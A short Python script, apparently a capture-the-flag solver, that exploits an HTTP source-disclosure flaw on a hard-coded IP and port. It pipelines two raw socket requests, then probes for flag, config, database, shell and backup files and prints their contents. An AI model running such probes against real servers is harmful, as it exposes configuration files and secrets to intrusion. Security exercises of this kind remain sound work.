#!/usr/bin/env python3
import socket
import requests

host = '61.147.171.105'
port = 58039

def get_source(target):
    """使用源代码泄露漏洞"""
    payload = (
        f'GET /{target} HTTP/1.1\r\n'
        f'Host: {host}\r\n'
        '\r\n'
        'GET /xyz.xyz HTTP/1.1\r\n'
        '\r\n'
    )
    
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(3)
    sock.connect((host, port))
    sock.send(payload.encode())
    
    response = b''
    while True:
        try:
            chunk = sock.recv(4096)
            if not chunk:
                break
            response += chunk
        except socket.timeout:
            break
    
    sock.close()
    return response

# 尝试各种可能的文件
files = [
    'flag.php',
    'flag.txt', 
    'flag',
    'f1ag.php',
    'fl4g.php',
    'secret.php',
    'admin.php',
    'shell.php',
    'config.php',
    'db.php',
    '.flag',
    '.htaccess',
    'robots.txt',
    'phpinfo.php',
]

print("[*] Scanning files using source disclosure...")
for f in files:
    result = get_source(f)
    decoded = result.decode('utf-8', errors='replace')
    
    # 检查是否不是404
    if '404 Not Found' not in decoded:
        if '\r\n\r\n' in decoded:
            body = decoded.split('\r\n\r\n', 1)[1]
            if body.strip():
                print(f'\n[+] Found: {f}')
                print(body[:500])
                print('-' * 50)

# 也直接访问一些静态文件
print("\n[*] Direct access to static files...")
static_files = ['flag.txt', 'flag', '.flag', 'robots.txt', 's3Cr37_f1L3.php.bak']
for f in static_files:
    try:
        r = requests.get(f'http://{host}:{port}/{f}', timeout=3)
        if r.status_code == 200 and 'Not Found' not in r.text:
            print(f'\n[+] {f}:')
            print(r.text[:500])
    except:
        pass
